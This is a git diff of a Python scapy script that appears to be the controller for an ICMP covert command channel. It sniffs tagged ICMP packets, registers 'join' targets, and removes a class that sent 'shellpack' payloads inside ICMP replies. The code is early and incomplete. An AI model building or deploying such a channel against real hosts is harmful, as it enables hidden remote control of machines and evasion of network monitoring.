@@ -18,9 +18,10 @@ class Controller(Host):
     
     def __init__(self):
         super().__init__()
-        self.type = "controller"
+        self.targets = []
 
     def sniff_callback(self, packet):
+        # Parses out things that shouldn't be there
         if packet[ICMP].type != 8:
             pass
         elif packet[ICMP].id != ICMP_ID:
@@ -34,10 +35,16 @@ class Controller(Host):
         
         match unpacked['command']:
             case "join":
-                print("fart")
-        
-        print(self.type)
-        print(unpacked['command'])
+                self.join(unpacked)
+            case _:
+                print("Default case")
+
+    def join(self, shellpack):
+        target = Target(shellpack)
+        self.targets.append(target)
+        print(target)
+        print(self.targets)
+        return
 
 def sniffing(controller):
      sniff(iface=controller.iface, filter="icmp", prn=controller.sniff_callback, store="0")
@@ -49,7 +56,6 @@ def setup_controller() -> Controller:
 
     return controller
 
-
 if __name__ == "__main__":
     controller = setup_controller()
 
@@ -59,13 +65,3 @@ if __name__ == "__main__":
     print("Starting listener")
     while True:
         input("")
-
-class Target:
-    def __init__(self, ip):
-        self.ip = ip
-    
-    def send(self, shellpack: str) -> bool:
-        data = (IP(dst=self.ip, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load=shellpack))
-        sr(data, timeout=0, verbose=0)
-        
-        return True
